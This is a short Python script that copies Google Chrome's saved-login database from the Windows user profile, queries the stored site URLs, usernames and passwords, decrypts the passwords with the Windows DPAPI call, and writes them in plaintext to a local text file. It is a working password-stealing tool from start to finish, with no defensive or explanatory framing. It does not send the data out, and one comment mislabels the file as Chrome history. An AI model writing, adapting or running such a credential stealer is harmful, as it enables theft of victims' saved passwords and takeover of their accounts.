import os
import sqlite3
import win32crypt
import sys
from shutil import copyfile
from sys import exit



def Find_path():
    User_profile = os.environ.get("USERPROFILE")
    History_path = User_profile + r"\\AppData\Local\Google\Chrome\User Data\Default\Login Data" #Usually this is where the chrome history file is located, change it if you need to.
    return History_path
def dest_path():
    User_profile = os.environ.get("USERPROFILE")
    return User_profile

source_file = Find_path()
copyfile(source_file, r"\LoginData.db")

# Connect to the Database
try:
    #print('[+] Opening ' + path)
    conn = sqlite3.connect(r"\LoginData.db")
    cursor = conn.cursor()
except Exception as e:
    print('[-] %s' % (e))
    sys.exit(1)

# Get the results
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except Exception as e:
    print('[-] %s' % (e))
    sys.exit(1)

data = cursor.fetchall()

if len(data) > 0:
    for result in data:
        # Decrypt the Password
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception as e:
            print('[-] %s' % (e))
            pass
        if password:
            file = open("data.txt","a")
            file.write('----------------------------------------------------------')
            file.write('''[+] URL: %s Username: %s Password: %s \n''' %(result[0], result[1], password))
            file.write('----------------------------------------------------------')
            file.close()
           
else:
    print('[-] No results returned from query')
    sys.exit(0)
